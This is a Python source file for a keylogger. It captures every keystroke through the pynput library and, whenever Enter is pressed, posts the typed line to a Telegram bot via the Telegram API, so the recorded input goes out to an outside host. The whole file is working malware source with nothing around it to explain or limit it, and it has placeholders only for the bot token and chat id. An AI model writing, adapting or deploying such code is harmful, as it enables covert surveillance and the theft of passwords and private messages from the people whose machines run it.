import requests
from pynput.keyboard import Key, Listener
from pynput import mouse
import telebot
import os


fullog = ''
words = ''
bot_token = 'token'
chat_id = 'id'
bot = telebot.TeleBot(bot_token)

def onPress(key):
    global fullog
    global words

    if key == Key.space:
        words += ' '

    elif key == Key.enter:
        fullog += words + '\n'
        send(fullog)
        words = ''
        fullog = ''
    elif key == Key.ctrl_l or key == Key.ctrl_r or key == Key.tab or key == Key.caps_lock or key == Key.shift_l or key == Key.shift_r:
        pass

    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    
@bot.message_handler(commands=["send"])
def send(message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

def main():
    with Listener(on_press=onPress) as listener:
        listener.join()

if __name__ == "__main__":
    main()
